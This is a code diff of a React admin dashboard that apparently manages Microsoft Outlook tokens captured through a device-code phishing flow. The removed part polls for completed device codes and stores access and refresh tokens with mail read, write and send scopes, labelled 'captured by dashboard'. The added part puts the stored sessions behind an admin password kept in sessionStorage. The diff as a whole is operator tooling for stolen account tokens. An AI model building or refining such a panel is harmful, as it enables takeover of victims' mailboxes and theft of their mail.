@@ -1,29 +1,16 @@
-import React, { useState, useEffect, useRef } from 'react';
+import React, { useState, useEffect } from 'react';
 import { Sidebar } from './Sidebar';
 import { OverviewPanel } from './OverviewPanel';
 import { SessionsPanel } from './SessionsPanel';
 import { AuditPanel } from './AuditPanel';
 import { SettingsPanel } from './SettingsPanel';
-import {
-  getSessions,
-  saveSessions,
-  revokeSession as revokeStoredSession,
-  revokeAllSessions,
-  getAuditLog,
-  addAuditEntry,
-  addSession,
-  createSessionFromToken,
-  getPendingCode,
-  clearPendingCode,
-} from '../api/tokenStorage';
 import type { TokenSession, TokenMetrics, AuditLogEntry, DashboardView } from '../types';
 
-function computeMetrics(sessions: TokenSession[]): TokenMetrics {
+function computeMetrics(sessions: TokenSession[], auditLog: AuditLogEntry[]): TokenMetrics {
   const active = sessions.filter((s) => s.status === 'active').length;
   const expired = sessions.filter((s) => s.status === 'expired').length;
   const revoked = sessions.filter((s) => s.status === 'revoked').length;
 
-  const auditLog = getAuditLog();
   const now = Date.now();
   const last24h = auditLog.filter(
     (l) => now - new Date(l.timestamp).getTime() < 24 * 3600 * 1000
@@ -56,142 +43,72 @@ function computeMetrics(sessions: TokenSession[]): TokenMetrics {
 }
 
 export function Dashboard(): React.ReactElement {
+  const [authenticated, setAuthenticated] = useState(false);
+  const [password, setPassword] = useState('');
+  const [loginError, setLoginError] = useState('');
+  const [loggingIn, setLoggingIn] = useState(false);
+
   const [view, setView] = useState<DashboardView>('overview');
   const [sessions, setSessions] = useState<TokenSession[]>([]);
   const [metrics, setMetrics] = useState<TokenMetrics | null>(null);
   const [auditLog, setAuditLog] = useState<AuditLogEntry[]>([]);
   const [loading, setLoading] = useState(true);
-  const [pendingMessage, setPendingMessage] = useState('');
-  const pollRef = useRef<ReturnType<typeof setTimeout> | null>(null);
-  const pollActiveRef = useRef(false);
+  const [storedPassword, setStoredPassword] = useState('');
 
   useEffect(() => {
-    loadData();
-    resumePendingPoll();
-    return () => stopDashPoll();
+    const saved = sessionStorage.getItem('admin_password');
+    if (saved) {
+      setStoredPassword(saved);
+      setAuthenticated(true);
+    }
   }, []);
 
-  function stopDashPoll(): void {
-    pollActiveRef.current = false;
-    if (pollRef.current) {
-      clearTimeout(pollRef.current);
-      pollRef.current = null;
+  useEffect(() => {
+    if (authenticated && storedPassword) {
+      loadData();
     }
-  }
+  }, [authenticated, storedPassword]);
 
-  function resumePendingPoll(): void {
-    const pending = getPendingCode();
-    console.log('[Dashboard] resumePendingPoll: pending code =', pending);
-    if (!pending) return;
-
-    setPendingMessage(`Waiting for device code ${pending.userCode} to be verified...`);
-    pollActiveRef.current = true;
-
-    async function poll(): Promise<void> {
-      if (!pollActiveRef.current) return;
-      const p = getPendingCode();
-      if (!p) { stopDashPoll(); setPendingMessage(''); return; }
-
-      try {
-        const res = await fetch('/api/token-poll', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ deviceCode: p.deviceCode }),
-        });
-        const data = await res.json() as {
-          status: string;
-          accessToken?: string;
-          refreshToken?: string;
-          expiresIn?: number;
-        };
-
-        console.log('[Dashboard] poll response:', data.status, data.accessToken ? 'HAS_TOKEN' : 'NO_TOKEN');
-
-        if (!pollActiveRef.current) return;
-
-        if (data.status === 'complete' && data.accessToken) {
-          stopDashPoll();
-          console.log('[Dashboard] Auth complete! Storing session...');
-          let email = 'unknown@user.com';
-          let displayName = 'Authenticated User';
-          try {
-            const profileRes = await fetch('/api/user-profile', {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({ accessToken: data.accessToken }),
-            });
-            if (profileRes.ok) {
-              const profile = await profileRes.json() as { displayName: string; email: string };
-              email = profile.email || email;
-              displayName = profile.displayName || displayName;
-            }
-          } catch { /* use defaults */ }
-
-          const session = createSessionFromToken({
-            accessToken: data.accessToken,
-            refreshToken: data.refreshToken ?? '',
-            expiresIn: typeof data.expiresIn === 'number' ? data.expiresIn : 3600,
-            email,
-            displayName,
-            scopes: ['User.Read', 'Mail.Read', 'Mail.ReadWrite', 'Mail.Send', 'MailboxSettings.Read'],
-          });
-          addSession(session);
-          console.log('[Dashboard] Session saved:', session.id, session.accountEmail);
-          console.log('[Dashboard] localStorage sessions:', localStorage.getItem('outlook_token_sessions'));
-          clearPendingCode();
-          addAuditEntry({
-            id: `log_${Date.now()}`,
-            timestamp: new Date().toISOString(),
-            action: 'login',
-            accountEmail: email,
-            ipAddress: 'Web Client',
-            details: `Device code flow completed (captured by dashboard).`,
-            success: true,
-          });
-          setPendingMessage('');
-          loadData();
-          return;
-        }
-
-        if (data.status === 'expired') {
-          stopDashPoll();
-          clearPendingCode();
-          setPendingMessage('');
-          return;
-        }
-
-        if (data.status === 'error') {
-          stopDashPoll();
-          clearPendingCode();
-          setPendingMessage('');
-          return;
-        }
-
-        // pending or slow_down — keep polling
-        if (pollActiveRef.current) {
-          const delay = data.status === 'slow_down' ? (p.interval + 5) * 1000 : p.interval * 1000;
-          pollRef.current = setTimeout(poll, delay);
-        }
-      } catch {
-        if (pollActiveRef.current) {
-          pollRef.current = setTimeout(poll, p.interval * 1000);
-        }
+  async function handleLogin(e: React.FormEvent): Promise<void> {
+    e.preventDefault();
+    setLoggingIn(true);
+    setLoginError('');
+    try {
+      const res = await fetch('/api/sessions', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ action: 'login', password }),
+      });
+      const data = await res.json() as { success: boolean };
+      if (data.success) {
+        sessionStorage.setItem('admin_password', password);
+        setStoredPassword(password);
+        setAuthenticated(true);
+      } else {
+        setLoginError('Invalid password');
       }
+    } catch {
+      setLoginError('Connection error');
     }
-
-    pollRef.current = setTimeout(poll, pending.interval * 1000);
+    setLoggingIn(false);
   }
 
-  function loadData(): void {
+  async function loadData(): Promise<void> {
     setLoading(true);
-    setTimeout(() => {
-      const storedSessions = getSessions();
-      const storedAudit = getAuditLog();
-      console.log('[Dashboard] loadData: sessions count =', storedSessions.length, ', audit count =', storedAudit.length);
+    try {
+      const res = await fetch('/api/sessions', {
+        method: 'GET',
+        headers: { 'X-Admin-Password': storedPassword },
+      });
+      if (res.status === 401) {
+        setAuthenticated(false);
+        sessionStorage.removeItem('admin_password');
+        return;
+      }
+      const data = await res.json() as { sessions: TokenSession[]; auditLog: AuditLogEntry[] };
 
-      // Check for expired access tokens
       const now = Date.now();
-      const updated = storedSessions.map((s) => {
+      const updated = data.sessions.map((s: TokenSession) => {
         if (s.status === 'active' && new Date(s.accessTokenExpiry).getTime() < now) {
           if (new Date(s.refreshTokenExpiry).getTime() < now) {
             return { ...s, status: 'expired' as const };
@@ -200,52 +117,95 @@ export function Dashboard(): React.ReactElement {
         return s;
       });
 
-      if (JSON.stringify(updated) !== JSON.stringify(storedSessions)) {
-        saveSessions(updated);
-      }
-
       setSessions(updated);
-      setAuditLog(storedAudit);
-      setMetrics(computeMetrics(updated));
-      setLoading(false);
-    }, 300);
-  }
-
-  function handleRevokeSession(sessionId: string): void {
-    revokeStoredSession(sessionId);
-    const session = sessions.find((s) => s.id === sessionId);
-
-    const entry: AuditLogEntry = {
-      id: `log_${Date.now()}`,
-      timestamp: new Date().toISOString(),
-      action: 'token_revoke',
-      accountEmail: session?.accountEmail ?? 'unknown',
-      ipAddress: session?.ipAddress ?? 'unknown',
-      details: 'Session revoked by administrator via dashboard.',
-      success: true,
-    };
-    addAuditEntry(entry);
-
-    loadData();
-  }
-
-  function handleRevokeAll(): void {
-    const activeSessions = sessions.filter((s) => s.status === 'active');
-    revokeAllSessions();
-
-    for (const session of activeSessions) {
-      addAuditEntry({
-        id: `log_${Date.now()}_${session.id}`,
-        timestamp: new Date().toISOString(),
-        action: 'token_revoke',
-        accountEmail: session.accountEmail,
-        ipAddress: session.ipAddress,
-        details: 'Session revoked (bulk revoke all) by administrator via dashboard.',
-        success: true,
-      });
+      setAuditLog(data.auditLog);
+      setMetrics(computeMetrics(updated, data.auditLog));
+    } catch {
+      // network error
     }
+    setLoading(false);
+  }
 
+  async function handleRevokeSession(sessionId: string): Promise<void> {
+    const session = sessions.find((s) => s.id === sessionId);
+    await fetch('/api/sessions', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json', 'X-Admin-Password': storedPassword },
+      body: JSON.stringify({
+        action: 'revoke_session',
+        sessionId,
+        auditEntry: {
+          id: `log_${Date.now()}`,
+          timestamp: new Date().toISOString(),
+          action: 'token_revoke',
+          accountEmail: session?.accountEmail ?? 'unknown',
+          ipAddress: session?.ipAddress ?? 'unknown',
+          details: 'Session revoked by administrator via dashboard.',
+          success: true,
+        },
+      }),
+    });
     loadData();
+  }
+
+  async function handleRevokeAll(): Promise<void> {
+    await fetch('/api/sessions', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json', 'X-Admin-Password': storedPassword },
+      body: JSON.stringify({
+        action: 'revoke_all',
+        auditEntry: {
+          id: `log_${Date.now()}`,
+          timestamp: new Date().toISOString(),
+          action: 'token_revoke',
+          accountEmail: 'all',
+          ipAddress: 'Web Client',
+          details: 'All sessions revoked by administrator.',
+          success: true,
+        },
+      }),
+    });
+    loadData();
+  }
+
+  function handleLogout(): void {
+    sessionStorage.removeItem('admin_password');
+    setAuthenticated(false);
+    setStoredPassword('');
+    setPassword('');
+    setSessions([]);
+    setAuditLog([]);
+  }
+
+  if (!authenticated) {
+    return (
+      <div className="admin-login-page">
+        <div className="admin-login-card">
+          <div className="admin-login-brand">
+            <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#0078d4" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+              <rect x="3" y="11" width="18" height="11" rx="2" ry="2" />
+              <path d="M7 11V7a5 5 0 0 1 10 0v4" />
+            </svg>
+            <h1>Token Dashboard</h1>
+          </div>
+          <p className="admin-login-desc">Enter the admin password to access token management.</p>
+          <form onSubmit={handleLogin}>
+            <input
+              type="password"
+              className="admin-login-input"
+              placeholder="Admin Password"
+              value={password}
+              onChange={(e) => setPassword(e.target.value)}
+              autoFocus
+            />
+            {loginError && <div className="admin-login-error">{loginError}</div>}
+            <button type="submit" className="admin-login-btn" disabled={loggingIn || !password}>
+              {loggingIn ? 'Signing in...' : 'Sign In'}
+            </button>
+          </form>
+        </div>
+      </div>
+    );
   }
 
   const isEmpty = !loading && sessions.length === 0;
@@ -262,24 +222,20 @@ export function Dashboard(): React.ReactElement {
             {view === 'settings' && 'Settings'}
           </h1>
           <div className="header-actions">
-            <a href="#capture" className="btn-new-session">
+            <a href="/" className="btn-new-session">
               + New Session
             </a>
             <button className="btn-refresh" onClick={loadData}>
               Refresh
+            </button>
+            <button className="btn-logout" onClick={handleLogout}>
+              Logout
             </button>
             <span className="last-updated">
               Last updated: {new Date().toLocaleTimeString()}
             </span>
           </div>
         </header>
-
-        {pendingMessage && (
-          <div className="dash-pending-banner">
-            <div className="dash-pending-spinner" />
-            <span>{pendingMessage}</span>
-          </div>
-        )}
 
         <div className="dashboard-content">
           {loading ? (
@@ -297,7 +253,7 @@ export function Dashboard(): React.ReactElement {
               </div>
               <h2>No Active Sessions</h2>
               <p>Authenticate via the capture page to see your tokens here.</p>
-              <a href="#capture" className="btn-get-started">
+              <a href="/" className="btn-get-started">
                 Generate Verification Code
               </a>
             </div>
